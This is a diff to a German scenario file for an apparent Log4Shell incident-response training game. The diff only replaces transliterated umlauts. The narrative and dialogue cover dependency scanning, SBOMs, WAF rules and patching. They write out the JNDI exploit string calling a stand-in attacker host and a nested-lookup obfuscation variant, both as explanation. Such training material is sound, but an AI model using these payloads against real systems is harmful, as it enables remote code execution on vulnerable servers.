@@ -15,7 +15,7 @@
   "narrator_mode": true,
   "dynamic_choices": true,
   "freetext_enabled": true,
-  "narrator_style": "Methodischer Techno-Thriller. Wie ein Puzzle das sich Schicht fuer Schicht enthuellt. Jede Dependency hat eine Dependency — und irgendwo in diesem Baum lauert die Luecke. Sachlich, praezise, aber mit wachsender Dringlichkeit.",
+  "narrator_style": "Methodischer Techno-Thriller. Wie ein Puzzle das sich Schicht für Schicht enthüllt. Jede Dependency hat eine Dependency — und irgendwo in diesem Baum lauert die Lücke. Sachlich, präzise, aber mit wachsender Dringlichkeit.",
   "gemini_role": "attacker",
   "characters": {
     "architect": {
@@ -49,7 +49,7 @@
       "portrait_emoji": "&#128737;"
     },
     "sysadmin": {
-      "name": "Kai \"Root\" Lindstroem",
+      "name": "Kai \"Root\" Lindström",
       "avatar": "&#129492;",
       "skill_bonus_pools": [
         "linux",
@@ -100,18 +100,18 @@
     {
       "id": "s1_cve_discovery",
       "title": "CVE-2021-44228",
-      "narrative": "Donnerstag, 9. Dezember 2021. Eine neue CVE taucht auf und die Security-Community explodiert. CVE-2021-44228 — CVSS Score: 10.0, das Maximum. Apache Log4j 2.x, die meistgenutzte Java-Logging-Bibliothek der Welt, hat eine Remote Code Execution Schwachstelle. Der Exploit ist erschreckend simpel: Wenn irgendein User-Input geloggt wird der den String ${jndi:ldap://attacker.com/a} enthaelt, laedt Log4j automatisch und fuehrt beliebigen Code vom Angreifer-Server aus. Kein Login noetig. Kein komplizierter Exploit-Chain. Einfach sechs Zeichen in ein Suchfeld tippen. Deine Organisation betreibt dutzende Java-Services.",
+      "narrative": "Donnerstag, 9. Dezember 2021. Eine neue CVE taucht auf und die Security-Community explodiert. CVE-2021-44228 — CVSS Score: 10.0, das Maximum. Apache Log4j 2.x, die meistgenutzte Java-Logging-Bibliothek der Welt, hat eine Remote Code Execution Schwachstelle. Der Exploit ist erschreckend simpel: Wenn irgendein User-Input geloggt wird der den String ${jndi:ldap://attacker.com/a} enthält, lädt Log4j automatisch und führt beliebigen Code vom Angreifer-Server aus. Kein Login nötig. Kein komplizierter Exploit-Chain. Einfach sechs Zeichen in ein Suchfeld tippen. Deine Organisation betreibt dutzende Java-Services.",
       "image": "scene_siem_dashboard.png",
       "animation_in": "mission_start",
       "npc_dialog": {
         "speaker": "dr_hassan",
-        "text": "Chen Zhaojun vom Alibaba Cloud Security Team hat das am 24. November an Apache gemeldet. Erste Exploits wurden in Minecraft-Servern gesehen — jemand hat JNDI-Payloads in den Chat getippt und damit den Server uebernommen. Jetzt ist der Exploit oeffentlich. Jeder Script-Kiddie kann das.",
+        "text": "Chen Zhaojun vom Alibaba Cloud Security Team hat das am 24. November an Apache gemeldet. Erste Exploits wurden in Minecraft-Servern gesehen — jemand hat JNDI-Payloads in den Chat getippt und damit den Server übernommen. Jetzt ist der Exploit öffentlich. Jeder Script-Kiddie kann das.",
         "portrait": "npc_hassan"
       },
       "choices": [
         {
           "id": "c1_inventory_java",
-          "text": "Sofort alle Java-Services inventarisieren — was laeuft wo?",
+          "text": "Sofort alle Java-Services inventarisieren — was läuft wo?",
           "icon": "&#128203;",
           "skill_check": {
             "pool_filter": "security",
@@ -196,7 +196,7 @@
     {
       "id": "s2_dependency_tree",
       "title": "Der Dependency-Baum",
-      "narrative": "Jan Kowalski hat den ersten Scan fertig. Das Ergebnis ist ein Albtraum. Log4j 2.x steckt nicht nur in euren eigenen Services — es ist in transitiven Dependencies versteckt. Spring Boot nutzt es. Apache Struts nutzt es. Euer Elasticsearch-Cluster, der Kafka-Broker, der Jenkins-Server. Sogar das interne Wiki (Confluence). mvn dependency:tree zeigt bei eurem Hauptservice 847 Dependencies — und 12 davon ziehen Log4j 2.14.1 rein. Nicht direkt, sondern ueber drei Ebenen verschachtelt. Die Frage ist: Welche internet-facing Services sind am kritischsten?",
+      "narrative": "Jan Kowalski hat den ersten Scan fertig. Das Ergebnis ist ein Albtraum. Log4j 2.x steckt nicht nur in euren eigenen Services — es ist in transitiven Dependencies versteckt. Spring Boot nutzt es. Apache Struts nutzt es. Euer Elasticsearch-Cluster, der Kafka-Broker, der Jenkins-Server. Sogar das interne Wiki (Confluence). mvn dependency:tree zeigt bei eurem Hauptservice 847 Dependencies — und 12 davon ziehen Log4j 2.14.1 rein. Nicht direkt, sondern über drei Ebenen verschachtelt. Die Frage ist: Welche internet-facing Services sind am kritischsten?",
       "image": "scene_forensics_terminal.png",
       "npc_dialog": {
         "speaker": "jan_kowalski",
@@ -206,7 +206,7 @@
       "choices": [
         {
           "id": "c2_dependency_scan",
-          "text": "Vollstaendigen Dependency-Tree-Scan aller Services ausfuehren",
+          "text": "Vollständigen Dependency-Tree-Scan aller Services ausführen",
           "icon": "&#127795;",
           "skill_check": {
             "pool_filter": "cysa_plus",
@@ -233,7 +233,7 @@
         },
         {
           "id": "c2_check_sbom",
-          "text": "SBOM (Software Bill of Materials) fuer alle Services pruefen",
+          "text": "SBOM (Software Bill of Materials) für alle Services prüfen",
           "icon": "&#128220;",
           "skill_check": {
             "pool_filter": "cysa_plus",
@@ -295,17 +295,17 @@
     {
       "id": "s2_dependency_tree_blind",
       "title": "Blindflug",
-      "narrative": "Ohne klaren Ueberblick ueber die betroffenen Services fliegst du blind. Waehrend du noch versuchst herauszufinden welche Systeme Log4j nutzen, melden sich die ersten Alarme: Verdaechtige JNDI-Lookups in den WAF-Logs. Die Angreifer waren schneller als du.",
+      "narrative": "Ohne klaren Überblick über die betroffenen Services fliegst du blind. Während du noch versuchst herauszufinden welche Systeme Log4j nutzen, melden sich die ersten Alarme: Verdächtige JNDI-Lookups in den WAF-Logs. Die Angreifer waren schneller als du.",
       "image": "scene_siem_dashboard.png",
       "npc_dialog": {
         "speaker": "jan_kowalski",
-        "text": "Ich sehe JNDI-Payloads in den Access-Logs unseres API-Gateways. Jemand probiert verschiedene Obfuskations-Varianten durch. Wir muessen JETZT handeln — egal ob der Scan fertig ist oder nicht.",
+        "text": "Ich sehe JNDI-Payloads in den Access-Logs unseres API-Gateways. Jemand probiert verschiedene Obfuskations-Varianten durch. Wir müssen JETZT handeln — egal ob der Scan fertig ist oder nicht.",
         "portrait": "npc_jan"
       },
       "choices": [
         {
           "id": "c2_emergency_scan",
-          "text": "Notfall-Scan: Alle internet-facing Services sofort pruefen",
+          "text": "Notfall-Scan: Alle internet-facing Services sofort prüfen",
           "icon": "&#9889;",
           "skill_check": {
             "pool_filter": "security",
@@ -327,7 +327,7 @@
       "image": "scene_firewall_config.png",
       "npc_dialog": {
         "speaker": "dr_hassan",
-        "text": "Die Obfuskation ist das Problem. Log4j interpretiert verschachtelte Lookups — ${${lower:j}ndi} wird zu ${jndi}. Einfache String-Matching-Regeln reichen nicht. Du brauchst entweder Deep Packet Inspection die Lookups aufloest, oder du musst an der Quelle patchen. Am besten beides.",
+        "text": "Die Obfuskation ist das Problem. Log4j interpretiert verschachtelte Lookups — ${${lower:j}ndi} wird zu ${jndi}. Einfache String-Matching-Regeln reichen nicht. Du brauchst entweder Deep Packet Inspection die Lookups auflöst, oder du musst an der Quelle patchen. Am besten beides.",
         "portrait": "npc_hassan"
       },
       "choices": [
@@ -418,11 +418,11 @@
     {
       "id": "s4_patch_mitigate",
       "title": "Patch or Mitigate",
-      "narrative": "Samstag, 11. Dezember. Das Patching-Wochenende. Aber es ist komplizierter als gedacht. Euer Hauptservice laesst sich auf Log4j 2.17.0 aktualisieren — aber drei Legacy-Services nutzen Log4j ueber eine Vendor-Bibliothek die ihr nicht selbst kompilieren koennt. Der Elasticsearch-Cluster braucht ein Upgrade auf eine neue Major-Version. Und der Jenkins-Server? 'Den fasst niemand an, der laeuft seit 2019', sagt Jan. Erschwerend kommt hinzu: Version 2.15.0, der erste Fix, war unvollstaendig (CVE-2021-45046). Version 2.16.0 hatte noch eine DoS-Luecke (CVE-2021-45105). Erst 2.17.0 ist wirklich sicher.",
+      "narrative": "Samstag, 11. Dezember. Das Patching-Wochenende. Aber es ist komplizierter als gedacht. Euer Hauptservice lässt sich auf Log4j 2.17.0 aktualisieren — aber drei Legacy-Services nutzen Log4j über eine Vendor-Bibliothek die ihr nicht selbst kompilieren könnt. Der Elasticsearch-Cluster braucht ein Upgrade auf eine neue Major-Version. Und der Jenkins-Server? 'Den fasst niemand an, der läuft seit 2019', sagt Jan. Erschwerend kommt hinzu: Version 2.15.0, der erste Fix, war unvollständig (CVE-2021-45046). Version 2.16.0 hatte noch eine DoS-Lücke (CVE-2021-45105). Erst 2.17.0 ist wirklich sicher.",
       "image": "scene_forensics_terminal.png",
       "npc_dialog": {
         "speaker": "lisa_park",
-        "text": "Board Meeting ist Montag. Ich muss wissen: Wie viel Prozent unserer Services sind gepatcht? Was ist der Plan fuer den Rest? Und koennen wir ausschliessen, dass wir bereits kompromittiert wurden? Ich brauche Zahlen, keine Vermutungen.",
+        "text": "Board Meeting ist Montag. Ich muss wissen: Wie viel Prozent unserer Services sind gepatcht? Was ist der Plan für den Rest? Und können wir ausschließen, dass wir bereits kompromittiert wurden? Ich brauche Zahlen, keine Vermutungen.",
         "portrait": "npc_lisa"
       },
       "choices": [
@@ -513,17 +513,17 @@
     {
       "id": "s5_supply_chain",
       "title": "Software Supply Chain",
-      "narrative": "Montag, 13. Dezember. Die akute Krise ist unter Kontrolle. Aber die eigentliche Frage bleibt: Wie konnte eine einzelne Bibliothek die halbe Welt lahmlegen? Log4j ist Open Source, gewartet von einer Handvoll Freiwilliger, genutzt von Millionen. Keine SBOM, keine automatische Vulnerability-Erkennung in der CI/CD-Pipeline, kein Ueberblick ueber transitive Dependencies. Lisa Park will einen Plan: 'Das darf nie wieder passieren.' In den USA veroeffentlicht die Regierung eine Executive Order die SBOMs fuer alle Bundesbehoerden-Lieferanten vorschreibt. Die Software Supply Chain ist das neue Schlachtfeld.",
+      "narrative": "Montag, 13. Dezember. Die akute Krise ist unter Kontrolle. Aber die eigentliche Frage bleibt: Wie konnte eine einzelne Bibliothek die halbe Welt lahmlegen? Log4j ist Open Source, gewartet von einer Handvoll Freiwilliger, genutzt von Millionen. Keine SBOM, keine automatische Vulnerability-Erkennung in der CI/CD-Pipeline, kein Überblick über transitive Dependencies. Lisa Park will einen Plan: 'Das darf nie wieder passieren.' In den USA veröffentlicht die Regierung eine Executive Order die SBOMs für alle Bundesbehörden-Lieferanten vorschreibt. Die Software Supply Chain ist das neue Schlachtfeld.",
       "image": "scene_security_hardening.png",
       "npc_dialog": {
         "speaker": "lisa_park",
-        "text": "Wir wussten nicht mal welche Libraries in unseren eigenen Services stecken. Das ist wie ein Krankenhaus das nicht weiss welche Medikamente es auf Lager hat. Ich will eine SBOM fuer jeden Service. Und ich will automatische Alerts wenn eine Dependency verwundbar wird.",
+        "text": "Wir wussten nicht mal welche Libraries in unseren eigenen Services stecken. Das ist wie ein Krankenhaus das nicht weiß welche Medikamente es auf Lager hat. Ich will eine SBOM für jeden Service. Und ich will automatische Alerts wenn eine Dependency verwundbar wird.",
         "portrait": "npc_lisa"
       },
       "choices": [
         {
           "id": "c5_mandate_sbom",
-          "text": "SBOM-Pflicht: Jeder Service muss eine aktuelle Software Bill of Materials fuehren",
+          "text": "SBOM-Pflicht: Jeder Service muss eine aktuelle Software Bill of Materials führen",
           "icon": "&#128220;",
           "skill_check": {
             "pool_filter": "cysa_plus",
@@ -577,7 +577,7 @@
         },
         {
           "id": "c5_supply_chain_program",
-          "text": "Vollstaendiges Supply Chain Security Programm aufbauen",
+          "text": "Vollständiges Supply Chain Security Programm aufbauen",
           "icon": "&#128737;",
           "skill_check": {
             "pool_filter": "security",
@@ -612,12 +612,12 @@
     {
       "id": "epilog_success",
       "title": "Zero Day, Zero Breach",
-      "narrative": "Drei Monate spaeter. Alle Services auf Log4j 2.17.0+. SBOM-Pflicht eingefuehrt. Automatisches Dependency-Scanning in jeder CI/CD-Pipeline. Als im Maerz 2022 die naechste kritische Schwachstelle auftaucht (Spring4Shell), wisst ihr innerhalb von 30 Minuten welche Services betroffen sind. Jan grinst: 'Diesmal kein Wochenend-Einsatz.' Die Krise hat euch staerker gemacht. Weltweit betrachtet: Log4Shell gilt als eine der schwerwiegendsten Schwachstellen in der Geschichte des Internets. Sie hat die Software Supply Chain Security Debatte nachhaltig veraendert.",
+      "narrative": "Drei Monate später. Alle Services auf Log4j 2.17.0+. SBOM-Pflicht eingeführt. Automatisches Dependency-Scanning in jeder CI/CD-Pipeline. Als im März 2022 die nächste kritische Schwachstelle auftaucht (Spring4Shell), wisst ihr innerhalb von 30 Minuten welche Services betroffen sind. Jan grinst: 'Diesmal kein Wochenend-Einsatz.' Die Krise hat euch stärker gemacht. Weltweit betrachtet: Log4Shell gilt als eine der schwerwiegendsten Schwachstellen in der Geschichte des Internets. Sie hat die Software Supply Chain Security Debatte nachhaltig verändert.",
       "image": "scene_victory.png",
       "animation_in": "campaign_complete",
       "npc_dialog": {
         "speaker": "jan_kowalski",
-        "text": "Spring4Shell kam — 30 Minuten bis zur Uebersicht, 4 Stunden bis zum Patch. Kein Notfall-Wochenende. So fuehlt sich professionelle Security an. SBOM hat sich am ersten Tag bezahlt gemacht.",
+        "text": "Spring4Shell kam — 30 Minuten bis zur Übersicht, 4 Stunden bis zum Patch. Kein Notfall-Wochenende. So fühlt sich professionelle Security an. SBOM hat sich am ersten Tag bezahlt gemacht.",
         "portrait": "npc_jan"
       },
       "choices": [],
@@ -628,11 +628,11 @@
     {
       "id": "epilog_partial",
       "title": "Gepatcht, aber Spuren",
-      "narrative": "Die meisten Services sind gepatcht. Aber die forensische Analyse zeigt: Ein Angreifer hat ueber den Elasticsearch-Cluster eine Reverse Shell etabliert — drei Stunden bevor der Patch live ging. Keine Daten exfiltriert (soweit erkennbar), aber die Backdoor musste entfernt und der Cluster neu aufgesetzt werden. Lisa Park ist erleichtert, aber der Vorfall zeigt: Stunden zaehlen bei einem CVSS-10-Zero-Day.",
+      "narrative": "Die meisten Services sind gepatcht. Aber die forensische Analyse zeigt: Ein Angreifer hat über den Elasticsearch-Cluster eine Reverse Shell etabliert — drei Stunden bevor der Patch live ging. Keine Daten exfiltriert (soweit erkennbar), aber die Backdoor musste entfernt und der Cluster neu aufgesetzt werden. Lisa Park ist erleichtert, aber der Vorfall zeigt: Stunden zählen bei einem CVSS-10-Zero-Day.",
       "image": "scene_partial_victory.png",
       "npc_dialog": {
         "speaker": "dr_hassan",
-        "text": "Drei Stunden Fenster. Das ist typisch fuer Log4Shell — die Exploitation begann innerhalb von Stunden nach Disclosure. Eure Reaktionszeit war gut, aber bei einem Zero Day muss sie noch besser sein. SBOM + automatisches Scanning haette euch 2 Stunden gespart.",
+        "text": "Drei Stunden Fenster. Das ist typisch für Log4Shell — die Exploitation begann innerhalb von Stunden nach Disclosure. Eure Reaktionszeit war gut, aber bei einem Zero Day muss sie noch besser sein. SBOM + automatisches Scanning hätte euch 2 Stunden gespart.",
         "portrait": "npc_hassan"
       },
       "choices": [],
@@ -643,7 +643,7 @@
     {
       "id": "epilog_fail",
       "title": "Supply Chain Reality Check",
-      "narrative": "Es hat drei Wochen gedauert bis alle Services gepatcht waren. In dieser Zeit wurde der Jenkins-Server kompromittiert — der Angreifer hatte Zugang zu Build-Artefakten und CI/CD-Secrets. Ein kompletter Credential-Rotation war noetig. Die Kosten: sechs Wochen Aufraeum-Arbeit, 400.000 Euro, und ein sehr unangenehmes Board Meeting. Aber: Lisa Park hat verstanden. 'Wir wussten nicht was in unserem eigenen Code steckt. Das ist wie Autofahren ohne Seitenspiegel.' Das Supply Chain Security Programm bekommt Top-Prioritaet und unbegrenztes Budget.",
+      "narrative": "Es hat drei Wochen gedauert bis alle Services gepatcht waren. In dieser Zeit wurde der Jenkins-Server kompromittiert — der Angreifer hatte Zugang zu Build-Artefakten und CI/CD-Secrets. Ein kompletter Credential-Rotation war nötig. Die Kosten: sechs Wochen Aufräum-Arbeit, 400.000 Euro, und ein sehr unangenehmes Board Meeting. Aber: Lisa Park hat verstanden. 'Wir wussten nicht was in unserem eigenen Code steckt. Das ist wie Autofahren ohne Seitenspiegel.' Das Supply Chain Security Programm bekommt Top-Priorität und unbegrenztes Budget.",
       "image": "scene_partial_victory.png",
       "npc_dialog": {
         "speaker": "lisa_park",
@@ -658,16 +658,16 @@
   ],
   "epilog": {
     "success": {
-      "narrative": "Alle Services gepatcht. SBOM-Pflicht eingefuehrt. Spring4Shell drei Monate spaeter? 30 Minuten bis zur Uebersicht. Die Krise wurde zum Katalysator fuer echte Supply Chain Security.",
+      "narrative": "Alle Services gepatcht. SBOM-Pflicht eingeführt. Spring4Shell drei Monate später? 30 Minuten bis zur Übersicht. Die Krise wurde zum Katalysator für echte Supply Chain Security.",
       "image": "scene_victory.png",
       "animation": "campaign_complete"
     },
     "partial": {
-      "narrative": "Gepatcht, aber ein Angreifer war schneller beim Elasticsearch-Cluster. Keine Daten verloren, aber die Backdoor musste entfernt werden. SBOM haette Stunden gespart.",
+      "narrative": "Gepatcht, aber ein Angreifer war schneller beim Elasticsearch-Cluster. Keine Daten verloren, aber die Backdoor musste entfernt werden. SBOM hätte Stunden gespart.",
       "image": "scene_partial_victory.png"
     },
     "fail": {
-      "narrative": "Drei Wochen bis zum Patch. Jenkins kompromittiert. 400.000 Euro Schaden. Aber der Weckruf fuehrt zu einem echten Supply Chain Security Programm mit unbegrenztem Budget.",
+      "narrative": "Drei Wochen bis zum Patch. Jenkins kompromittiert. 400.000 Euro Schaden. Aber der Weckruf führt zu einem echten Supply Chain Security Programm mit unbegrenztem Budget.",
       "image": "scene_partial_victory.png"
     }
   },
